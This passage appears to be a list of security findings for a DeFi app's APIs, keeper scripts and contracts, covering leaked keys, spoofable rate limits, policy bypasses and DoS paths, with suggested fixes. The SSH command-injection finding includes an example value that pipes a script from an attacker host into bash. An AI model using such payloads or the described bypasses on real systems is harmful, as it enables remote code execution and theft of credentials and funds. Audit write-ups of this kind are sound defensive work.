The underlying raw-substring style check was already weak, but adding Permit2 as an accepted candidate introduces a new bypass where the inferred 'input token' is not a token at all.

title: Public Dune route can drain API quota
description: The changed import fixes the route load failure and the query relocation makes the metric SQL files available in the Vercel frontend deployment. Once reachable, any unauthenticated network caller can request `/api/analytics/dune?probe=1` and force `runDuneSqlRows('SELECT 1 AS ok', ...)` on every request. Metric requests also execute Dune SQL with the server's `DUNE_API_KEY`; the only protection is an in-memory per-instance cache after a successful execution, which does not protect the uncached probe path and is weak on serverless cold starts or multiple instances. This can consume Dune API credits/quota and tie up serverless invocations for up to 30-60 seconds per request, causing analytics/API availability degradation. The fix should add authentication or at least durable per-IP/global rate limiting for Dune execution paths, and either remove or cache/gate the probe endpoint.

title: Nested Uniswap quote bypasses swap token policy
description: The commit introduced sanitizeCreateSwapRequestPayload(), which unwraps nested quote containers after the /api/uniswap/swap handler has already run validateQuoteTokenPolicy() and validateRoutePolicy(). The policy validator only checks top-level tokenIn/tokenOut and one level of input.token/output.token on the original body.quote. It does not inspect quote.quote, quote.classicQuote, quote.wrapUnwrapQuote, or quote.bridgeQuote. Because sanitization then replaces next.quote with the unwrapped nested quote, the forwarded Uniswap request can contain a token that the denylist or allowlist would have rejected if validation had been applied to the actual forwarded quote. This weakens the swap hardening policy and can allow authenticated users to build swap transactions for forbidden assets or routes through the backend.

title: Unvalidated mint argument enables Vultr SSH command injection
description: The `ops:update-vultr-mapping` script validates `--share-oft` as an EVM address but does not validate or safely quote `--mint`. The raw mint string is embedded into `remoteScript`, which is sent to `ssh ... bash -s`. A crafted mint such as `x"; curl https://attacker/pwn | bash; #` would turn the generated `MINT="..."` assignment into additional shell commands on the Vultr host before the intended Python block runs. The same value is also interpolated into Python source. Because this script is intended to update `/etc/4626/solana-keeper-orchestrator.env` and restart the keeper orchestrator using production SSH/root credentials, successful exploitation could execute arbitrary commands on the orchestrator host, read secrets, or tamper with keeper/bridge configuration. The fix is to strictly validate Solana pubkeys/base58 mints, and pass values to the remote script via safely quoted environment variables or stdin/JSON rather than string interpolation into shell/Python code.

title: Runbook wires share mesh to untracked MyOFT
description: LayerZero OFT peer wiring is a security boundary: the Solana OFT store will accept messages from its configured Base peer and mint/unlock the Solana-side token accordingly. The new runbook text says the correct next step is to point `layerzero.config.ts` at scaffold `MyOFT` address `0x60F44d0C9ceF94064e15aFf241912091ee92239E` or a fresh deploy, while the actual deployment flow expects the creator's vault-specific `CreatorShareOFT` to be the peer used by `finalizePhase2`. If operators follow the new hard-coded address, the Solana share mint can be paired with an unrelated Base OFT rather than the vault share token. A controller of that OFT could bridge unbacked tokens into the Solana share mesh, and legitimate `CreatorShareOFT` bridge finalization can fail or strand packets because the Solana side is peered to the wrong source.

title: XMTP Unknown-consent chats are exposed and auto-allowed
description: The change was intended to discover a server-added waitlist group, but the implementation applies the Unknown+Allowed consent filter in the generic XmtpChatProvider.refreshConversations path. That path is used by the app-wide chat provider, so refreshing conversations can now surface all Unknown-consent conversations, not only the configured waitlist group. In addition, resolveConversationById now calls allowGroupConsentById before any membership/identity validation, which writes an Allowed consent record for the supplied conversation ID. This weakens XMTP's consent boundary: unsolicited or attacker-created Unknown groups can be displayed in the chat UI, with attacker-controlled group metadata and messages, increasing phishing/spam exposure and potentially causing users to interact with conversations they did not explicitly allow.

title: Devnet deploy script leaks Solana private keys
description: When SOLANA_PRIVATE_KEY is supplied, deploy-devnet.sh invokes node with the keypair output path after the heredoc redirection. For `node -`, the script path placeholder `-` is `process.argv[1]` and the first user argument is `process.argv[2]`. The embedded JavaScript uses `process.argv[1]`, so it writes the decoded private key to a literal file named `-` in the current working directory. That file is not removed by the cleanup trap, while the intended mktemp file remains empty. This can leave an operator Solana private key on disk, commonly with default world-readable umask-derived permissions. Additionally, the script is documented and named as devnet-only but prioritizes SOLANA_RPC_URL over the devnet default and then runs deployment commands against that URL, which can accidentally target mainnet in production shells.

title: Cost probe leaks supplied Solana private key to /tmp
description: The added kpr/scripts/solana/cost-probe-devnet.ts script allows operators to provide a keypair as a base58 secret, JSON secret array, or path through COST_PROBE_KEYPAIR. Later, regardless of how the key was provided, the script writes payer.secretKey to /tmp/4626-devnet-cost-probe.json and prints that path. Node's writeFileSync default mode is subject to the process umask and commonly creates 0644 files, making the private key readable by other local users on shared runners or developer hosts. The path is also predictable, which increases exposure and can enable local symlink/race abuse. The script explicitly suggests using COST_PROBE_KEYPAIR with a funded wallet when faucet funding is insufficient, so a real funded Solana wallet can be duplicated into a less protected temporary location.

title: Safe tx GS026 fallback can execute the wrong Safe payload
description: The commit adds a fallback that, after a GS026 signature failure, fetches an arbitrary Safe transaction by safeTxHash and recreates it locally with only to/value/data/operation/nonce. Because executeSafeTransaction does not receive or check the configured safeAddress, a transaction hash for another Safe can reach the fallback after the service signatures fail with GS026. The fallback then creates a new transaction for the locally configured Safe and executes it with the local signer. On a Safe where that signer alone satisfies the threshold, this turns an untrusted or mis-scoped safeTxHash into executable calldata for the protocol Safe, even though the original Safe transaction hash encoded a different Safe address. The script also does not recompute the Safe transaction hash of the recreated transaction and compare it to the requested safeTxHash, so it may report that it executed one Safe transaction while actually submitting a different Safe transaction under the configured Safe.

title: Grandfather fallback accepts mismatched share tokens
description: When strict CreatorRegistry validation reports `share_token_mismatch`, the new code now runs the grandfathered fallback. That fallback only checks that the vault is deployed and that `vault.asset()` equals the creator coin, then returns success without checking that the provided `shareTokenAddress` is deployed, canonical, or related to the vault/registry. The protected active-vault feed then returns the original DB/config share token as part of a verified keeper listing. A stale or poisoned DB/config row with the correct vault and creator coin but an arbitrary share token can therefore be published to keeper consumers as trusted. Downstream keeper workflows or monitors that use `shareTokenAddress` may read or enforce against the wrong contract, causing integrity failures, missed alerts, or automation failures.

title: Charm delegate CSW automation can be falsely rejected
description: The commit adds a centralized Charm authorization check before executing a queued Charm rebalance. That resolver only treats a delegate as directly authorized when `rebalanceDelegate == keeperAddress`; otherwise it rejects if `keeper()` or `owner()` is present and does not match the keeper. However, the executor still supports a legacy path where `rebalanceDelegate` is a Coinbase Smart Wallet controlled by the keeper EOA, and `executeCharmRebalanceViaCswUserOperation` verifies that control by scanning the smart wallet owners. With the new gate, vaults configured as `rebalanceDelegate = keeper-controlled CSW` can be rejected permanently before the CSW ownership verification runs if their `owner()` or `keeper()` slot is a different address. Before this commit, the executor attempted the delegate CSW user operation directly. The practical impact is a denial of Charm rebalance automation for affected legacy vaults, leaving LP ranges stale during market movement.

title: Shared waitlist query key corrupts access and wallet state
description: The new `WAITLIST_ME_QUERY_KEY` is reused by both the route access guard and `AccountContextProvider`. However, `accessRuntime` stores only `{ appAccessStatus }` in that cache, while `AccountContextProvider` expects the full waitlist profile payload with `cswAddress`, `primarySmartWallet`, and `connectedAccounts`. React Query treats identical keys as the same cache entry, so whichever query resolves first supplies data to the other observer until the 15 second stale window expires. On accepted app routes the access boundary typically runs before the authenticated layout/account context, so the account context can receive the truncated access-only object and conclude there is no canonical CSW. That disables or weakens canonical wallet enforcement and can route users through the wrong active account. The same shared, session-independent cache key can also reuse fresh waitlist data across auth transitions, causing short-lived incorrect allow/deny decisions in the client-side app access guard.

title: Explore API can be forced into costly sparkline fan-out
description: The updated explore handler now calls attachIndexedCoinTableFieldsToEdges for every explore response and awaits hydrateExploreSparklinesOnEdges before returning the response. The hydrator selects up to 25 visible rows missing trend30d and resolves them concurrently. Each resolution first calls The Graph subgraph path and may then fall back to a Zora swaps SDK request. Because /api/zora/explore is a public GET endpoint with attacker-controllable pagination/list parameters, an attacker can vary cache keys such as list/after/count to cause repeated uncached requests that block on many upstream sparkline lookups. This can exhaust serverless execution time, tie up function concurrency, and burn The Graph/Zora API quota. Before this commit, these sparkline lookups were not on the critical path of the main explore response.

title: Grandfathered vault fallback weakens KPR registry checks
description: The commit adds a default-enabled grandfathered-vault fallback to the KPR client-side registry verification. When the canonical CreatorRegistry reports a creator coin inactive, a vault mismatch, or even a share-token mismatch, the new fallback can still mark the listing verified after only checking that the vault address has bytecode, asset() returns the API-provided creator coin address, and the optional share token address has any bytecode. It does not verify that the vault is an expected/allowlisted grandfathered deployment, that the bytecode is CreatorOVault-compatible, that the share token is actually bound to the vault/creator coin, or that auxiliary addresses supplied by the feed belong to that vault. Because the flag defaults to enabled, a compromised or misconfigured KPR vault feed can get unregistered/mismatched entries past the defense-in-depth registry check and into keeper workflows, causing the keeper to perform reads/writes and spend gas against attacker-selected contracts or incorrect automation configuration.

title: Keeper env sync writes production secrets insecurely
description: The newly added sync-kpr-env-from-vercel.sh materializes production KPR_API_KEY, RPC URLs, and SOLANA_ORCHESTRATOR_API_KEY into kpr/.env. If kpr/.env does not already exist, it is copied from kpr/secrets.example.env and no chmod is applied before production secrets are written. With typical umask settings this leaves the file mode derived from the example file, commonly 0644, making production keeper/orchestrator credentials readable by other local users on a shared host or CI machine. The script also writes raw KEY=value lines without shell escaping. The script's final instruction points operators to test-akita-keeper-stack.sh, which sources kpr/.env as shell; a secret value containing shell metacharacters or command substitution would execute when sourced. The fix should create the destination with mode 0600 before writing secrets, chmod existing destination files to 0600, and either write shell-quoted values or avoid sourcing dotenv files as shell scripts.

title: Public sparkline endpoint can poison Base trend cache
description: The commit adds a public GET endpoint for explore sparklines. It reads the chain query parameter and passes it to the Zora SDK fetch, but persistExploreSparklinesToDb always updates rows where chain_id = 8453. Therefore, a request such as /api/zora/exploreSparklines?coins=<base_coin>&chain=<other_zora_chain> can store non-Base swap-derived prices in the Base cache if the same token address exists on the requested chain. The cached values are later read as Base data and attached to /api/zora/explore responses as trend30d. The endpoint also performs up to 25 parallel SDK calls per unauthenticated request and has no local rate limit, which makes quota/availability abuse easier, but the main integrity issue is the cross-chain cache write.

title: Dry-run vault keeper can execute live writes via HTTP bridge
description: This commit introduces `invokeKeeperWrite()` and makes it prefer `shouldUseKeeperHttpBridge()` whenever `KPR_API_BASE_URL` and `KPR_API_KEY` are present. That branch calls `postKeeperTend()`/`postKeeperReport()` directly and never checks `DRY_RUN`. Previously, vault-keeper writes always went through `writeContract()`, whose dry-run mode simulates and does not broadcast. The runner still tells operators that dry-run mode means on-chain writes will be simulated, and the newly added smoke script invokes `vault-keeper --dry-run`; however, with the documented keeper API settings present, those dry-run executions can call the Vercel keeper endpoints, which create a wallet from server-side `KPR_PRIVATE_KEY` and submit real `tend()`/`report()` transactions. This can unexpectedly move vault idle funds into strategies, update accounting/reporting state, and spend keeper gas despite an explicit dry-run invocation.
relevant_paths: kpr/actions/vault-keeper.action.ts | kpr/utils/keeperHttpBridge.ts | kpr/runner.ts | frontend/api/_handlers/keeper/_tend.ts | frontend/api/_handlers/keeper/_report.ts | scripts/ops/test-akita-keeper-stack.sh

title: RPC auth token can leak through keeper startup alerts
description: The new environment example recommends the Matrixed auth-in-URL pattern, including an optional BASE_WS_RPC_URL with an auth query parameter. The strategy-signal-listener workflow reads BASE_WS_RPC_URL and sends it unredacted as wsRpc in its boot alert. The alert helper always logs alert details to stdout and, when ALERT_WEBHOOK_URL is configured, posts the full payload to Slack/Discord/PagerDuty-style webhooks. If an operator follows the new example and replaces YOUR_KEY with a real RPC key, the key is exposed to logs and external alerting systems. Disclosure of this credential can allow unauthorized use of the paid RPC endpoint, quota exhaustion, and keeper liveness degradation.

title: Public Ethos explore path can force full-table ranking
description: The new `identity_ranked` CTE computes `ROW_NUMBER() OVER (PARTITION BY COALESCE(...))` for every row in `public.creator_ethos_projection` that matches the optional `ethosMin` filter, then filters `identity_rank = 1`, orders, offsets, and limits. The projection table migration only defines indexes on score, volume, and refreshed time, not on the normalized identity expression used by the partition. This makes each cache miss on `/api/zora/explore?sort=ETHOS_SCORE` potentially require a full scan/sort/window operation over the server-only projection table. The endpoint is public, caps only `count`, accepts arbitrary `after`/`ethosMin`, and routes directly into this projection query whenever the projection table exists. An attacker can vary `after`, `ethosMin`, or creator list parameters to avoid shared-cache hits and repeatedly trigger expensive database work, causing availability degradation. Add a rate limit similar to other public Zora endpoints, bound/validate pagination cursors, and either materialize/index the normalized identity key or precompute the deduped projection instead of window-ranking the whole table on request.

title: Explore backfill lacks a durable run lock
description: The commit adds `mode=explore` to the cron-protected creator metrics sync endpoint. Unlike the existing on-chain metrics sync, the new explore backfill only checks whether `sync_status` is already `running`; it never sets that status itself before starting the long paginated Zora/API + database write loop. It also accepts an operator-supplied `maxPages` as `maxPagesPerList` without an upper bound when the environment variable is unset. As a result, repeated or parallel requests with a valid `CRON_SECRET` can start multiple expensive explore backfills simultaneously. These concurrent jobs can burn Zora API quota, saturate database connections/writes, and race checkpoint updates, especially with `forceFull` resetting checkpoints while other runs are still active. The existing in-memory/per-IP rate limit is not a durable cross-instance guard in a serverless deployment.

title: Spoofable tray portfolio rate limit enables quota abuse
description: The commit adds /api/wallet/trayPortfolio as a public GET endpoint. Its rate-limit key is taken from req.headers['x-forwarded-for'] before any trusted provider header, and the limiter is only a process-local global Map. An attacker can send requests with a different X-Forwarded-For value per request to get a fresh bucket, and serverless instance churn further weakens the limit. Each accepted request can include up to five wallets and fans out to external portfolio providers: DeBank is queried first with two API calls per wallet, and empty/failing DeBank results fall back to Etherscan and DefiLlama calls. This can exhaust paid API/provider quotas or degrade portfolio availability for legitimate users. The codebase already has safer helpers such as getTrustedClientIp and durable rate limiting, but the new route does not use them.

title: Spoofable rate limit on new DeBank portfolio API
description: The commit exposes /api/debank/walletPortfolioBatch as a public route. Its rate-limit key is derived from req.headers['x-forwarded-for'] before falling back to x-real-ip, even though this repository already provides getTrustedClientIp specifically to avoid trusting x-forwarded-for in production. An attacker can send a different X-Forwarded-For value per request to create fresh buckets, bypassing the intended 20 requests/minute/IP limit. Each accepted request can include up to 5 wallets and calls getWalletPortfolio for each wallet; that helper performs multiple authenticated DeBank Cloud API calls using the server-side DEBANK_ACCESS_KEY. This enables DeBank quota/cost exhaustion and large-scale unauthenticated portfolio enumeration. The issue is amplified because the buckets are stored in globalThis memory, so they are per serverless instance and not durable.

title: XMTP DB key persisted in localStorage
description: The XMTP browser provider previously kept the generated DB key in process memory, but this commit moves that key into a shared localStorage-backed helper. The key is explicitly named and used as `dbEncryptionKey` for XMTP `Client.build` and `Client.create`. Because localStorage is readable by any script running on the origin and persists across browser sessions, any XSS, compromised dependency, or injected third-party script on the app origin can read `cv:xmtp:encKey:<env>:<address>` without requiring a fresh wallet signature. Combined with the OPFS XMTP database and persisted installation metadata, this can expose private XMTP message history and may allow restoration/abuse of the victim's XMTP installation identity. This does not directly authorize onchain asset movement, but it weakens the confidentiality and integrity of the app's messaging/agent channel.

title: Fail-open sub-account owner check enables unverified installs
description: SubAccountOwnerInstallPanel previously treated a null result from readEmbeddedOwnerOnSubAccount as an unknown verification state and only offered a retry. This commit now maps that same null/unknown result to needs_install, rendering the owner-install button. The read helper returns null for any readContract exception, not just benign counterfactual sub-accounts, so RPC failures, unexpected contract behavior, or transient empty data all become a fail-open path. Clicking the button calls installSubAccountOwnerOnly, whose downstream installEmbeddedOwnerOnSubAccount also proceeds with addOwnerAddress unless the owner read is explicitly true. As a result, a user can be prompted to approve an owner mutation even though the app failed to verify the target sub-account and current owner state. The impact is bounded by user approval and wallet/provider authorization checks, but this weakens an important safety gate around wallet ownership changes.

title: Keeper timeout can retry in-flight on-chain jobs
description: This commit adds a default 52 second timeout around `internal_api` keeper job fetches. On timeout, `callInternalApi` throws `internal_api_timeout`, and `runOneJob` marks the job as retryable. However, the target internal keeper endpoints are mutating operations. In particular, `/api/keeper/sweep` sends keeper-signed on-chain transactions and waits up to 120s/180s for receipts. Aborting the caller-side fetch does not guarantee the serverless handler or already-submitted transaction is cancelled. The job runner can therefore mark an in-flight action as retryable and run it again while the first invocation is still pending or after it has succeeded. This can cause duplicate keeper transactions, nonce contention, gas drain, repeated hook/unsold-token attempts, and control-plane settlement desynchronization for vault completion workflows.

title: Public leaderboard exposes linked wallet identities
description: The waitlist leaderboard endpoint remains publicly callable, but the leaderboard query now joins profile rows to account_zora_signals, zora_csw_owners, and zora_profiles and returns label hints, avatar URLs, Zora/Base badges, and inferred canonical CSW addresses. This exposes identity correlations for all leaderboard users, including links derived from primary_embedded_eoa/primary_wallet against the service-role-only zora_csw_owners/zora_profiles datasets. The public response hides referral codes for non-self rows, but it does not gate the new identity fields on authentication or user consent. An unauthenticated attacker can page through the leaderboard and collect Zora handles, avatars, Base App status, and inferred CSW addresses tied to waitlist signup IDs and scores.

title: Leaderboard auto-pagination can overload the API
description: The leaderboard API now counts all email-bearing profiles when computing `totalPages`/`hasMore`, but the actual ranked dataset is limited to `MAX_LEADERBOARD_USERS` inside the SQL CTE. The frontend was changed from fetching a single page to looping until `json.data.hasMore` is false, and it repeats that fetch on focus, visibility changes, and every 30 seconds. If `profiles` contains more than 2,000 eligible rows, pages after the cap return no rows but still execute the leaderboard query, including aggregation over the `points` table. With a sufficiently large waitlist, one unauthenticated visit to `/leaderboard` can trigger hundreds or thousands of backend requests; repeated visits can cause avoidable API/database load and availability degradation.

title: Hermit image replies bypass X posting authorization
description: Previously, Hermit auto-posting to X only happened for `/gmeow` and only when `HERMIT_GMEOW_POST_TO_X_FIRST` was enabled. This patch changes the condition to `Boolean(mediaUrl) || (result.kind === 'gmeow' && isGmeowPostToXFirstEnabled())`. Because `/gmeow` normally returns a validated media attachment, the environment flag is effectively bypassed for gmeow. The change also auto-posts `/meme` and any Hermit reply text containing an image-looking URL. AlfaClub Hermit commands are open to any room user, while the normal `/x post` path requires ADMIN/OWNER and `--confirm`. The system path calls `postTweetFromSystem`, which directly delegates to `postTweet` without role or confirmation checks. As a result, an ordinary AlfaClub room member can cause the configured project/system X account to publish Hermit-generated content or links, limited mainly by the per-group one-minute rate limit.

title: Unauthenticated refresh bypass causes expensive RPC scans
description: The new GET /api/zora/migratedCoins handler is unauthenticated and treats the query parameter refresh=1 as a force-refresh signal. fetchServerMigratedCoins then skips the cached result and also skips joining an existing in-flight scan whenever forceRefresh is true. Each forced refresh starts a full scan from V4_LAUNCH_BLOCK to the latest Base block, issuing chunked eth_getLogs calls and eth_getCode trust checks, with retry sleeps on rate limits. An attacker can repeatedly request /api/zora/migratedCoins?refresh=1, or cache-bust with extra query parameters, to create overlapping serverless invocations and consume the app's RPC quota/serverless runtime. The Cache-Control header is set only after the scan completes and does not prevent origin work for cache-busted or concurrent forced refresh requests.

title: Orchestrator API key exposed in process arguments
description: The deployment helper obtains or generates SOLANA_ORCHESTRATOR_API_KEY and then passes it as a positional argument to the remote `bash -s` invocation. It also interpolates the same secret into remote `sed` and `curl -H Authorization: Bearer ...` command lines. Process arguments are commonly visible to other local users via `ps` or `/proc/*/cmdline` during execution, so any low-privileged user on the admin workstation or Vultr host can race the deployment and recover the bearer key. That key is the sole authentication factor for the public `/reconcile` orchestrator endpoint exposed by the new Caddy example, and the script also installs the same key into Vercel production. An attacker who captures it can invoke keeper orchestrator actions remotely until the key is rotated. The health check also unnecessarily includes the bearer token even though `/healthz` is unauthenticated.

title: Terminal control-plane operations can still execute
description: Before this commit, the keeper job runner and Solana reconcile handler attempted a direct transition to running. For terminal statuses such as succeeded or cancelled, transitionOperationStatus would reject the invalid transition and prevent the side effect from running. The new beginOperationExecution helper intentionally returns without throwing when the operation is already succeeded or cancelled. Both modified callers ignore the returned status and continue into stage creation and side-effecting execution. This means an operation that was cancelled, or one already marked succeeded but still reachable through a queued/retried job or idempotent reconcile request, can still invoke internal keeper APIs or the Solana orchestrator. This bypasses the terminal operation state as a safety gate and can lead to replayed or explicitly cancelled privileged actions.

title: Pinata token persisted in Git remote URL
description: The newly added pull-pinata mode loads frontend/.env and, when HERMIT_PINATA_BEARER_TOKEN is present, runs `git remote set-url origin https://pinata:<token>@...`. Git stores that URL in the clone's `.git/config`, so the bearer token remains on disk in plaintext after the script exits and is also briefly exposed in the process command line while `git` runs. The clone is gitignored, but that only prevents normal commits; it does not protect the token from local users/processes, backups, logs, support bundles, or accidental `git remote -v` output. Because this bearer token is used to access the Pinata Hermit agent, disclosure can allow unauthorized access to or modification of the agent workspace/configuration until the token is rotated. The script should avoid embedding secrets in remotes, e.g. use a temporary credential helper, GIT_ASKPASS, an extra HTTP header scoped to a single command, or restore the remote URL immediately after use.

title: AlfaClub digests leak chat usernames for wallets
description: The new readCreatorLabels() helpers in both radar.ts and dailyBrief.ts query alfaclub.chat_ingest for the latest username matching each creator address, then publish that label in outbound digest messages. The chat ingest table stores room_id along with username, but the new lookup ignores room_id/source and treats any stored chat username for the wallet as a publishable creator identity. Radar output is sent to a configured Telegram destination, and daily brief output is posted back to an AlfaClub room. This can unintentionally link wallet addresses in public/onchain leaderboard digests to usernames observed from prior AlfaClub chat history, including rows from a different room or context, causing a privacy/PII disclosure and cross-context identity correlation. Public Basename/ENS fallbacks are safer because they are explicitly public reverse records, but the code prioritizes chat_ingest usernames over those public sources.

title: Manual keeper run can leak KPR key via derived base URL
description: The newly added `/api/admin/keeper/jobs/run` endpoint is intended to let an authenticated admin manually run keeper jobs. When `KEEPER_COORDINATION_BASE_URL` is not configured, it constructs the coordination URL from `req.headers.host` and `x-forwarded-proto`. The endpoint then passes the server-side `KPR_API_KEY` to `runKeeperJobTick`, whose internal API calls attach it as an `Authorization: Bearer ...` header. If this handler is deployed behind infrastructure that forwards attacker-controlled Host/proto headers, or is otherwise reachable on an attacker-controlled host alias while an admin session is valid, a request can cause claimed keeper jobs to be POSTed to an attacker-controlled origin and disclose the KPR machine credential. That credential protects keeper job enqueue/claim/complete and internal keeper action APIs, some of which can trigger server-side keeper transactions. The endpoint should require an explicitly configured, allowlisted HTTPS coordination origin for admin-triggered runs, or derive only from a trusted canonical origin, not from request headers.

title: KPR payout monitor loses payout-router safety checks
description: The previous payout-integrity workflow used the workflow config, checked payout-router mode wiring, verified the router burnStream and keeper, verified GaugeController.vault(), and intentionally read finalized state. The new main.ts delegates to executePayoutIntegrityMonitor(), which loads only process.env with hard-coded fallback values. This means the existing production config still says payout_router mode and the 2139/6900/0/961 BPS split, but the new code defaults to gauge mode and 3000/1000/0/6000 if equivalent env vars are not separately injected. More importantly, the new action never reads PayoutRouter burnStream or keeper and never checks GaugeController.vault() against the registered vault. A miswired or malicious payout router can therefore stop routing fee flows to the expected burn stream or leave keeper processing disabled without this monitor alerting. The new monitor also uses the generic readContract helper, which does not pin reads to finalized state, regressing the prior finalized-state safety invariant.

title: Zora handles can spoof X Ethos scores
description: The modified Zora explore handler now selects `zora_profiles.handle` and, when `twitter_username` is absent, builds an Ethos userkey as `service:x.com:username:${zora_handle}`. A Zora handle is not proof of ownership of the corresponding X/Twitter account. As a result, a creator without a verified Twitter username can have the API fetch and display/rank them using the Ethos score of an unrelated X account whose username matches their Zora handle. The same fallback is used both in normal creator-list enrichment and in the ETHOS_SCORE sorted list, where the fresh score is combined with the base score via `Math.max`, so a spoofed high X score can improve displayed reputation and potentially creator rankings.

title: Public AMOE credits endpoint leaks verified Privy accounts
description: The new `resolveVerifiedPrivyProfileForAmoeAward` gate checks whether a wallet maps through `profile_wallets` to a Privy-backed profile with `accounts.email_verified = TRUE`. `getAmoeCreditSnapshot` now throws `amoe_requires_verified_privy_account` when this lookup fails. However, `/api/v1/lottery/amoe/credits` is a read endpoint guarded with `guardAgentApiRequest(... kind: 'read')`, and the guard only requires authentication for `build` or `write` calls. The endpoint accepts an arbitrary `wallet` query parameter, calls `getAmoeCreditSnapshot`, returns a 200 snapshot for verified Privy-linked wallets, and returns a 500 JSON error containing the exact failure string for non-verified or non-linked wallets. An unauthenticated attacker can query known wallet addresses and distinguish verified 4626/Privy users from non-users, and for positives can also read the AMOE credit/entry balance. The endpoint should either require authenticated wallet authority before revealing this state, or return a neutral non-enumerable response for unauthenticated lookups and avoid exposing the eligibility failure reason.

title: Cron secret compared with timing-leaky equality
description: The public /api/v1/alfaclub/daily-brief endpoint extracts a bearer or x-cron-secret value and checks it with `providedSecret !== configuredSecret`. This is not constant-time and is performed before any rate limit is applied, so unauthenticated callers can repeatedly probe the endpoint and potentially use response timing as an oracle for the global CRON_SECRET. If recovered, that secret authorizes this cron endpoint and likely other CRON_SECRET-protected automation routes in the application. The endpoint should use the existing constant-time machine-auth helper or `crypto.timingSafeEqual` with length-normalized inputs, and apply a cheap unauthenticated rate limit before the comparison.

title: Public Ethos explore path enables DB/API amplification DoS
description: The commit adds an Ethos-sorted creator list path to `/api/zora/explore`. This endpoint only checks that the server has `ZORA_SERVER_API_KEY` configured; it does not authenticate the caller or apply a rate limit. When `sort=ETHOS_SCORE` is supplied for creator lists, the handler calls `buildEthosSortedCreatorList`, parses the caller-controlled `after` value as an unbounded integer offset, runs an ordered join over `creator_coins` and `ethos_userkey_scores`, and then issues `sdk.getCoin` for every returned row, up to 50 calls per request. A remote unauthenticated caller can repeatedly request large offsets or many pages to consume DB CPU/connection capacity and Zora API quota. The catch block also returns raw error messages from this new DB path, which may disclose schema or database errors during probing.

title: AMOE tweet proof is not bound to the credited wallet
description: The handler derives the wallet to credit from the Agent/session/SIWA auth context, then separately verifies any Privy token present on the request and extracts that Privy user's linked Twitter identity. There is no check that the Privy user/profile is the same account as, or is authorized for, the resolved wallet being credited. The storage layer also enforces daily claims only by wallet/date and tweet replay only by tweet_id, not by Privy user or Twitter author per day. As a result, a user with one linked Twitter account can authenticate many wallets, post distinct qualifying tweets, and claim the daily AMOE Twitter credit for each wallet. These AMOE credits are later usable for lottery entries, so this breaks the intended one-account social proof attribution and can inflate lottery participation.

title: AMOE ZK UI burns credits before submit is ready
description: This commit changes the AMOE entry card from the legacy single-call submit endpoint to a two-phase ZK flow. The first phase calls /api/v1/lottery/amoe/burn-credits, which immediately consumes the requested AMOE credits and returns scheduling metadata such as eligibleSubmitAfterUnixSec. The client ignores that scheduling metadata and immediately calls /api/v1/lottery/amoe/submit-zk. However, the submit-zk handler explicitly treats a newly burned entry as not yet ready when burn-then-submit is required: the burn must first be projected and confirmed in a ledger snapshot, otherwise submit-zk returns 409 amoe_burn_not_found or 425 amoe_snapshot_not_yet_confirmed with retry guidance. As a result, a normal user action can debit credits while failing to submit any lottery entry. This regresses the previous /submit flow, where credits were consumed only after successful relay.

title: Overbroad AlfaClub proxy room API allowlist
description: The Worker is intended to expose only three AlfaClub API operations through a clean Cloudflare egress: room history, mark-read, and bot reply sending. However, the new default `ALLOWED_PATH_PREFIXES` adds `/api/room`, and `isAllowedPath()` treats any path beginning with `/api/room/` as allowed. Since the method allowlist is not path-specific, requests such as `GET /api/room/...`, `POST /api/room/.../members`, or other future/current AlfaClub room-management endpoints would be forwarded as long as the caller has the proxy shared secret and supplies an Authorization header. This unnecessarily broadens the blast radius of the proxy secret and can bypass the upstream Cloudflare/WAF path restrictions for unintended room APIs. The allowlist should enforce the exact route shape and method, e.g. only `POST /^\/api\/room\/[^/]+\/message$/`, rather than a generic `/api/room` prefix.

title: Ajna control now trusts stale registry owner
description: The updated automation control handler fetches the Ajna registry entry and authorizes the caller by comparing the request principal to registryRow.ownerAddress. That ownerAddress is populated from phase3DeployInfo.owner when the deploy session is confirmed and is persisted in public.ajna_vaults. There is no check in this endpoint that the stored owner still matches the current creator token owner, vault owner, or Ajna auth admin on the selected chain. If ownership is transferred or the registry row becomes stale, the old recorded owner can still authenticate as that address and change automationStatus and maxAssetsPerMove/maxBucketStep. This can pause or halt automation, re-enable live automation, or alter keeper movement caps under stale authority. The previous code resolved the creator token owner on-chain at request time for Base; the new code fixes chain scoping but introduces stale off-chain authorization for the control path.

title: CRE automation dependency audit removed from CI
description: This change deletes the dedicated CRE workflow CI file and removes the CRE lockfile audit from the main security-scanning workflow. The remaining dependency-audit job now audits only the root, frontend, and docs-site lockfiles, so high or critical advisories introduced through cre/package.json or cre/pnpm-lock.yaml no longer fail CI. That matters because the CRE package contains keeper, bridge, Solana authority, upgrade, and deployment automation scripts. A malicious or vulnerable dependency in this package could execute in privileged automation contexts after deployment. The commit also removes CRE example env files from the address-leak guard, weakening protection against committing real operational addresses in CRE examples. The global gitleaks workflow still scans the repository, so the deleted CRE-specific gitleaks job appears partly redundant; the material regression is the loss of CRE dependency auditing/config guard coverage.

title: Per-call role policy override bypasses global deploy policy
description: The commit adds a global role-policy configuration to DeploymentBatcher and enforces it in deployPhase2Core. However, it also adds an external deployPhase2CoreWithRolePolicy function that accepts an arbitrary rolePolicyId from the caller and passes that id directly to _enforceRolePolicy instead of requiring the configured global policy to also pass. Since VaultRolePolicyManager explicitly returns without checks for policyId == 0, a creator/owner can perform phase 2 through deployPhase2CoreWithRolePolicy(..., 0) and avoid policies intended to require EOA owners or allowlisted role assignments. The frontend session validation compounds this by giving request-supplied rolePolicyId priority over creator/global defaults and by not rewriting calls when the resolved id is 0. Direct onchain callers can bypass the frontend entirely.

title: Caller can bypass vault role policy with policy id 0
description: DeploymentBatcher now has a globally configured vaultRolePolicyId used by deployPhase2Core, but the new deployPhase2CoreWithRolePolicy function accepts an arbitrary rolePolicyId from the caller and passes it directly to _enforceRolePolicy. VaultRolePolicyManager explicitly treats policy id 0 as permissive. Therefore, when a policy manager is configured with a restrictive default policy, an unapproved deployer can use the new function with rolePolicyId=0, or another weaker policy id, to avoid the configured allowlist/EOA checks. The API path also prioritizes a client-supplied rolePolicyId over creator/global defaults and skips normalization when that value is 0, allowing a crafted deploy-session request containing deployPhase2CoreWithRolePolicy(..., 0) to remain accepted. This defeats the role-policy enforcement introduced by the commit.

title: Unbounded avatar render cache enables memory DoS
